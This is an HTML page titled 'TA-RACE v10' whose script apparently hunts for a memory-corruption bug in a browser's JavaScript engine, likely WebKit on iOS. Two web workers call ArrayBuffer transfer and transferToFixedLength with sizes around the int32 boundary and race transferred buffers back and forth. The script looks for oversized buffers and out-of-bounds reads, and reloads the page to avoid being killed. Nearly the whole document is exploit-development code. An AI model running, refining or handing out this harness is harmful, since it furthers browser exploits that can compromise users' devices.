<!doctype html>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TA-RACE v10</title>
<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
<div id=o>[TA-RACE v10] transferToFixedLength int32-boundary + auto-reload</div>
<script>
const o=document.getElementById('o');
const log=m=>{o.textContent+="\n"+m;};
window.addEventListener('error',e=>log("[ERROR] "+e.message));
log("[*] UA: "+navigator.userAgent);

// auto-reload before jetsam (CPU limit is over 180s window)
setTimeout(()=>location.reload(), 90000);

// sizes crossing the int32 boundary (Oct-27 x2 signature = 0x80000000)
const SIZES=[0x7FFFFFF0,0x7FFFFFFF,0x80000000,0x80000001,0xFFFFFFFF,0x100000000,0x100000008,0x1FFFFFFFF];
const CTORS=[Uint8Array,Uint32Array,Float64Array];

// W1: direct transferToFixedLength boundary fuzz on resizable buffers
const wT=new Worker(URL.createObjectURL(new Blob([`
onmessage=e=>{
  const S=e.data.sizes;
  for(let round=0;round<100000;round++){
    for(const n of S){
      for(const C of [Uint8Array,Float64Array]){
        try{
          const es=C.BYTES_PER_ELEMENT;
          const ab=new ArrayBuffer(64,{maxByteLength:0x100000});
          // n in bytes; also try n as element count
          const out=ab.transferToFixedLength(n);
          const bl=out.byteLength;
          if(bl>0x100000){ postMessage({hit:1,n:n,es:es,bl:bl,round:round}); }
          // write pattern + read back OOB
          const v=new C(out);
          if(v.length>0){ v[0]=1.1; const probe=v[v.length-1]; if(probe!==undefined) postMessage({probe:1,n:n,len:v.length}); }
        }catch(_){}
        try{
          const ab2=new ArrayBuffer(64,{maxByteLength:0x100000});
          const out2=ab2.transfer(n); // transfer with fixed length = same path family
          if(out2.byteLength>0x100000) postMessage({hit:2,n:n,bl:out2.byteLength,round:round});
        }catch(_){}
      }
    }
  }
  postMessage({done:1});
};`])));
wT.onmessage=e=>{
  const d=e.data;
  if(d.done){log("W1 done");return;}
  log("HIT "+JSON.stringify(d));
  if(d.bl){ try{ log("serializing..."); structuredClone; }catch(_){} }
};

// W2: transfer ring (transferAnchors CAS race) - light
const wR=new Worker(URL.createObjectURL(new Blob([`
onmessage=e=>{ for(const ab of e.data.abs){
  let out=ab;
  try{ out=(Math.random()<0.5)?ab.transfer():ab.transferToFixedLength(4096); }catch(_){}
  try{ postMessage({abs:[out]},[out]); }catch(_){}
} };
`])));
let inFlight=0;
wR.onmessage=e=>{ for(const ab of e.data.abs){ inFlight--; try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){} } };
wT.postMessage({sizes:SIZES});

(async()=>{
  let it=0;
  log("[*] main loop");
  while(true){
    if(inFlight<16){
      const ab=new ArrayBuffer(256,{maxByteLength:2048});
      try{ab.resize(512+(it&1023));}catch(_){}
      try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
    }
    it++;
    if((it&0x3FF)===0){log("[*] it="+it+" inflight="+inFlight);await new Promise(r=>setTimeout(r,50));}
  }
})();
</script>
